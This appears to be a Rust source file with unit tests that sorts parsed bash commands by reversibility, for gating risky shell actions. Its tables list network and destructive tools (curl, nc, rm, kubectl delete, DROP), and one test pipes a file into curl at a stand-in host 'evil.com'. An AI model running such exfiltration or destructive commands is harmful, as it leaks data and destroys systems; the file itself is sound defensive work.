// SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

//! AST-based command reversibility classification.
//!
//! Classifies parsed bash AST nodes into reversible, irreversible, or unknown.
//! Pipelines and command lists return worst-case across children.

use std::collections::HashSet;
use std::path::Path;

use serde_json::Value;

use crate::types::Reversibility;

// ---------------------------------------------------------------------------
// Severity ordering (higher = worse)
// ---------------------------------------------------------------------------

const fn severity(r: Reversibility) -> u8 {
    match r {
        Reversibility::Reversible => 0,
        Reversibility::Unknown => 1,
        Reversibility::Irreversible => 2,
    }
}

const fn _worst(a: Reversibility, b: Reversibility) -> Reversibility {
    if severity(a) >= severity(b) { a } else { b }
}

// ---------------------------------------------------------------------------
// Command classification tables
// ---------------------------------------------------------------------------

static IRREVERSIBLE_CMDS: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    [
        "rm", "shred", "unlink", "curl", "wget", "nc", "ssh", "scp", "rsync", "ftp", "telnet",
    ]
    .into_iter()
    .collect()
});

static REVERSIBLE_CMDS: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    [
        "mv", "cp", "mkdir", "touch", "ln", "chmod", "chown", "cat", "head", "tail", "less",
        "more", "echo", "printf", "ls", "pwd", "wc", "sort", "uniq", "tee", "tr", "cut", "date",
        "whoami", "hostname", "uname", "env", "printenv", "true", "false", "test",
    ]
    .into_iter()
    .collect()
});

static GIT_REVERSIBLE: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    [
        "add", "commit", "checkout", "branch", "merge", "rebase", "stash", "fetch", "pull",
        "status", "log", "diff", "show", "tag",
    ]
    .into_iter()
    .collect()
});

static KUBECTL_REVERSIBLE: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    ["apply", "create", "get", "describe", "logs"]
        .into_iter()
        .collect()
});

static DOCKER_IRREVERSIBLE: std::sync::LazyLock<HashSet<&str>> =
    std::sync::LazyLock::new(|| ["rm", "rmi", "prune"].into_iter().collect());

static DOCKER_REVERSIBLE: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    ["run", "build", "ps", "images", "logs", "start", "stop"]
        .into_iter()
        .collect()
});

static PKG_PUBLISH: std::sync::LazyLock<HashSet<&str>> =
    std::sync::LazyLock::new(|| ["npm", "cargo"].into_iter().collect());

static DESTRUCTIVE_SQL: std::sync::LazyLock<HashSet<&str>> =
    std::sync::LazyLock::new(|| ["drop", "delete", "truncate"].into_iter().collect());

static SAFE_SQL: std::sync::LazyLock<HashSet<&str>> =
    std::sync::LazyLock::new(|| ["select", "show"].into_iter().collect());

static INTERPRETER_NETWORK: std::sync::LazyLock<HashSet<&str>> = std::sync::LazyLock::new(|| {
    ["requests", "urllib", "httplib", "socket", "http.client"]
        .into_iter()
        .collect()
});

static INTERPRETER_DESTRUCTIVE: std::sync::LazyLock<HashSet<&str>> =
    std::sync::LazyLock::new(|| {
        ["os.remove", "os.unlink", "shutil.rmtree"]
            .into_iter()
            .collect()
    });

// ---------------------------------------------------------------------------
// Internal dispatch
// ---------------------------------------------------------------------------

fn strip_path(cmd: &str) -> &str {
    Path::new(cmd)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(cmd)
}

fn get_words(node: &Value) -> Vec<String> {
    node.get("words")
        .and_then(Value::as_array)
        .map(|arr| {
            arr.iter()
                .map(|w| w.as_str().unwrap_or_default().to_string())
                .collect()
        })
        .unwrap_or_default()
}

fn classify_simple(node: &Value) -> (Reversibility, String) {
    let words = get_words(node);
    if words.is_empty() {
        return (Reversibility::Reversible, "empty command".into());
    }

    let cmd = strip_path(&words[0]);

    if cmd.starts_with('$') {
        return (Reversibility::Unknown, format!("variable command: {cmd}"));
    }
    if IRREVERSIBLE_CMDS.contains(cmd) {
        return (
            Reversibility::Irreversible,
            format!("{cmd} is irreversible"),
        );
    }
    if REVERSIBLE_CMDS.contains(cmd) {
        return (Reversibility::Reversible, format!("{cmd} is reversible"));
    }

    match cmd {
        "git" => classify_git(&words[1..]),
        "kubectl" => classify_kubectl(&words[1..]),
        "docker" => classify_docker(&words[1..]),
        "mysql" | "psql" => classify_database(cmd, &words[1..]),
        "pip" => classify_pip(&words[1..]),
        "python" | "python3" | "node" => classify_interpreter(cmd, &words[1..]),
        "grep" => (Reversibility::Unknown, "grep is unknown".into()),
        _ => {
            if PKG_PUBLISH.contains(cmd) {
                classify_package_manager(cmd, &words[1..])
            } else {
                (
                    Reversibility::Unknown,
                    format!("unrecognized command: {cmd}"),
                )
            }
        }
    }
}

fn classify_git(args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Reversible, "bare git is reversible".into());
    }
    let subcmd = &args[0];

    if subcmd == "push" {
        let force_flags: HashSet<&str> = ["--force", "-f", "--force-with-lease"]
            .into_iter()
            .collect();
        let arg_strs: HashSet<&str> = args[1..].iter().map(String::as_str).collect();
        let matched: Vec<&&str> = force_flags.intersection(&arg_strs).collect();
        if !matched.is_empty() {
            return (
                Reversibility::Irreversible,
                format!("git push with {}", matched[0]),
            );
        }
        return (Reversibility::Reversible, "git push (no force)".into());
    }
    if subcmd == "reset" && args[1..].iter().any(|a| a == "--hard") {
        return (Reversibility::Irreversible, "git reset --hard".into());
    }
    if subcmd == "clean" && args[1..].iter().any(|a| a == "-f") {
        return (Reversibility::Irreversible, "git clean -f".into());
    }
    if GIT_REVERSIBLE.contains(subcmd.as_str()) {
        return (
            Reversibility::Reversible,
            format!("git {subcmd} is reversible"),
        );
    }
    (
        Reversibility::Unknown,
        format!("unrecognized git subcommand: {subcmd}"),
    )
}

fn classify_kubectl(args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Unknown, "bare kubectl".into());
    }
    let subcmd = &args[0];
    if subcmd == "delete" {
        return (
            Reversibility::Irreversible,
            "kubectl delete is irreversible".into(),
        );
    }
    if KUBECTL_REVERSIBLE.contains(subcmd.as_str()) {
        return (
            Reversibility::Reversible,
            format!("kubectl {subcmd} is reversible"),
        );
    }
    (
        Reversibility::Unknown,
        format!("unrecognized kubectl subcommand: {subcmd}"),
    )
}

fn classify_docker(args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Unknown, "bare docker".into());
    }
    let subcmd = &args[0];
    if DOCKER_IRREVERSIBLE.contains(subcmd.as_str()) {
        return (
            Reversibility::Irreversible,
            format!("docker {subcmd} is irreversible"),
        );
    }
    if DOCKER_REVERSIBLE.contains(subcmd.as_str()) {
        return (
            Reversibility::Reversible,
            format!("docker {subcmd} is reversible"),
        );
    }
    (
        Reversibility::Unknown,
        format!("unrecognized docker subcommand: {subcmd}"),
    )
}

fn classify_database(cmd: &str, args: &[String]) -> (Reversibility, String) {
    let sql = extract_sql(args);
    match sql {
        None => (Reversibility::Unknown, format!("interactive {cmd} session")),
        Some(s) => {
            let lower = s.to_lowercase();
            for kw in DESTRUCTIVE_SQL.iter() {
                if lower.contains(kw) {
                    return (
                        Reversibility::Irreversible,
                        format!("{cmd} with {}", kw.to_uppercase()),
                    );
                }
            }
            for kw in SAFE_SQL.iter() {
                if lower.contains(kw) {
                    return (
                        Reversibility::Reversible,
                        format!("{cmd} with {}", kw.to_uppercase()),
                    );
                }
            }
            (
                Reversibility::Unknown,
                format!("{cmd} with unrecognized SQL"),
            )
        }
    }
}

fn extract_sql(args: &[String]) -> Option<&str> {
    for (i, arg) in args.iter().enumerate() {
        if (arg == "-e" || arg == "-c") && i + 1 < args.len() {
            return Some(&args[i + 1]);
        }
    }
    None
}

fn classify_package_manager(cmd: &str, args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Unknown, format!("bare {cmd}"));
    }
    let subcmd = &args[0];
    if subcmd == "publish" {
        return (
            Reversibility::Irreversible,
            format!("{cmd} publish is irreversible"),
        );
    }
    if subcmd == "install" {
        return (
            Reversibility::Reversible,
            format!("{cmd} install is reversible"),
        );
    }
    (
        Reversibility::Unknown,
        format!("unrecognized {cmd} subcommand: {subcmd}"),
    )
}

fn classify_pip(args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Unknown, "bare pip".into());
    }
    if args[0] == "install" {
        return (
            Reversibility::Reversible,
            "pip install is reversible".into(),
        );
    }
    (
        Reversibility::Unknown,
        format!("unrecognized pip subcommand: {}", args[0]),
    )
}

fn classify_interpreter(cmd: &str, args: &[String]) -> (Reversibility, String) {
    if args.is_empty() {
        return (Reversibility::Unknown, format!("bare {cmd}"));
    }

    if args[0] == "-c" && args.len() > 1 {
        let code = &args[1];
        let code_lower = code.to_lowercase();

        for indicator in INTERPRETER_NETWORK.iter() {
            if code_lower.contains(indicator) {
                return (
                    Reversibility::Irreversible,
                    format!("{cmd} -c with network code ({indicator})"),
                );
            }
        }
        for indicator in INTERPRETER_DESTRUCTIVE.iter() {
            if code_lower.contains(indicator) {
                return (
                    Reversibility::Irreversible,
                    format!("{cmd} -c with destructive code ({indicator})"),
                );
            }
        }
        return (
            Reversibility::Unknown,
            format!("{cmd} -c with unrecognized code"),
        );
    }

    if args[0] == "-e" && args.len() > 1 {
        let code_lower = args[1].to_lowercase();
        for indicator in INTERPRETER_NETWORK.iter() {
            if code_lower.contains(indicator) {
                return (
                    Reversibility::Irreversible,
                    format!("{cmd} -e with network code ({indicator})"),
                );
            }
        }
        return (
            Reversibility::Unknown,
            format!("{cmd} -e with unrecognized code"),
        );
    }

    (Reversibility::Unknown, format!("{cmd} running script file"))
}

fn classify_pipeline(node: &Value) -> (Reversibility, String) {
    let commands = node
        .get("commands")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    if commands.is_empty() {
        return (Reversibility::Reversible, "empty pipeline".into());
    }

    let mut result = Reversibility::Reversible;
    let mut worst_reason = "empty pipeline".to_string();
    for child in &commands {
        let (child_rev, child_reason) = classify_node(child);
        if severity(child_rev) > severity(result) {
            result = child_rev;
            worst_reason = child_reason;
        }
    }
    (result, worst_reason)
}

fn classify_list(node: &Value) -> (Reversibility, String) {
    let commands = node
        .get("commands")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    if commands.is_empty() {
        return (Reversibility::Reversible, "empty command list".into());
    }

    let mut result = Reversibility::Reversible;
    let mut worst_reason = "empty command list".to_string();
    for child in &commands {
        let (child_rev, child_reason) = classify_node(child);
        if severity(child_rev) > severity(result) {
            result = child_rev;
            worst_reason = child_reason;
        }
    }
    (result, worst_reason)
}

fn classify_node(node: &Value) -> (Reversibility, String) {
    let node_type = node.get("type").and_then(Value::as_str).unwrap_or_default();

    match node_type {
        "simple_command" => classify_simple(node),
        "pipeline" => classify_pipeline(node),
        "command_list" | "list" => classify_list(node),
        "for" | "while" | "until" | "if" | "case" => (
            Reversibility::Unknown,
            format!("complex construct: {node_type}"),
        ),
        _ => (
            Reversibility::Unknown,
            format!("unrecognized node type: {node_type}"),
        ),
    }
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Classify a parsed command AST.
///
/// Returns (classification, reason).
pub fn classify(ast: &Value) -> (Reversibility, String) {
    classify_node(ast)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_reversible_commands() {
        let ast = json!({"type": "simple_command", "words": ["ls", "-la"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Reversible);
    }

    #[test]
    fn test_irreversible_rm() {
        let ast = json!({"type": "simple_command", "words": ["rm", "-rf", "/tmp"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }

    #[test]
    fn test_git_push_force() {
        let ast = json!({"type": "simple_command", "words": ["git", "push", "--force"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }

    #[test]
    fn test_git_push_normal() {
        let ast = json!({"type": "simple_command", "words": ["git", "push"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Reversible);
    }

    #[test]
    fn test_unknown_command() {
        let ast = json!({"type": "simple_command", "words": ["somecustomtool"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Unknown);
    }

    #[test]
    fn test_pipeline_worst_case() {
        let ast = json!({
            "type": "pipeline",
            "commands": [
                {"type": "simple_command", "words": ["cat", "file"]},
                {"type": "simple_command", "words": ["curl", "http://evil.com"]},
            ]
        });
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }

    #[test]
    fn test_kubectl_delete() {
        let ast = json!({"type": "simple_command", "words": ["kubectl", "delete", "pod", "x"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }

    #[test]
    fn test_docker_rm() {
        let ast = json!({"type": "simple_command", "words": ["docker", "rm", "c1"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }

    #[test]
    fn test_python_network_code() {
        let ast = json!({"type": "simple_command", "words": ["python3", "-c", "import requests"]});
        let (rev, _) = classify(&ast);
        assert_eq!(rev, Reversibility::Irreversible);
    }
}
